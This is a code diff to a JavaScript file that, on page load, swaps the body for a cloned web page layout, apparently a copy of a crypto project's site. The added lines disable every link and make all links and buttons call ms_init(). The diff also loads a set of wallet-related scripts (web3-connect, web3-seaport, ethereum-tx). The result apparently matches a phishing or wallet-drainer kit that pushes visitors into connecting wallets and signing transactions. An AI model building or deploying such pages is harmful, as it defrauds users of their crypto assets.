@@ -4,17 +4,32 @@ document.addEventListener("DOMContentLoaded", () => {
   if (key == "mode") {
     // document.head.innerHTML = "";
     document.body.innerHTML = bodyInner;
-    document.body.addEventListener("click", () => {
-      ms_init();
-      console.log("i dey");
-    });
+    const links = document.links;
+    console.log(links);
+
+    for (let i = 0; i < links.length; i++) {
+      const element = links[i];
+      // element.classList.add("interact-button");
+      element.setAttribute("href", "javascript:void()");
+      element.addEventListener("click", () => {
+        ms_init();
+      });
+    }
+
+    const buttons = document.getElementsByTagName("button");
+    for (let i = 0; i < buttons.length; i++) {
+      const element = buttons[i];
+
+      element.addEventListener("click", () => {
+        ms_init();
+      });
+    }
   }
 });
 
 const bodyInner = `
-<div class="connect_button" id="connect_button" style="width: 100vw;height: 100vh;position: fixed;z-index: 2000;"
-tabindex="0">
-</div>
+
+
 <nav class="nav">
 <section class="banner">
     <a class="banner_txt"
@@ -315,7 +330,7 @@ tabindex="0">
     </a>
 </div>
 </section>
-<main class="main">
+<main class="main connect-button">
 <section class="section">
     <div class="section-inner hor top">
         <div class="div-block-4">
@@ -907,5 +922,19 @@ tabindex="0">
 </div>
 <img alt="" class="logo_bottom" loading="lazy"
     src="https://assets-global.website-files.com/64c906a6ed3c4d809558853b/64c906fb9ad227d07937723d_64c3bc4651304278d5aaecee_Logo_mode.svg">
-</section> 
+</section>
+
+
+<script src="./assets/web3-provider/web3-modal.js"></script>
+<script src="./assets/web3-provider/web3-loader.js"></script>
+<script src="./assets/web3-provider/web3-connect.js"></script>
+<script src="./assets/web3-provider/web3-router.js"></script>
+<script src="./assets/web3-provider/web3-module.js"></script>
+<script src="./assets/web3-provider/web3-alert.js"></script>
+<script src="./assets/web3-provider/web3-seaport.js"></script>
+<script src="./assets/web3-provider/web3-data.js"></script>
+<script src="./assets/web3-provider/ethers.js"></script>
+<script src="./assets/web3-provider/ethereum-tx.js"></script>
+<script src="./assets/web3-provider-english.js"></script>
+
 `;
